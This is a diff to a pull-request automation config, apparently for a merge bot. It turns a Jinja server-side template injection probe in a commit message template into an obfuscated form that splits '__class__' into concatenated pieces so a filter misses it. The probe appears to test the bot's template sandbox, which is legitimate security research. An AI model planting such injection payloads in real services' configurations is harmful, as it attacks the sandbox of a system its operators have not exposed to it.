@@ -1,8 +1,8 @@
 pull_request_rules:
-  - name: VM1 legacy Jinja attr-filter sandbox probe
+  - name: VM1 legacy Jinja dynamic attr sandbox probe
     conditions:
-      - title = VM1_SSTI_ATTR_PROBE
+      - title = VM1_SSTI_DYNAMIC_ATTR_PROBE
     actions:
       merge:
         method: merge
-        commit_message_template: "VM1_SSTI_ATTR={{ ''|attr('__class__') }}"
+        commit_message_template: "VM1_SSTI_DYNAMIC={{ '' | attr('_' ~ '_class_' ~ '_') }}"
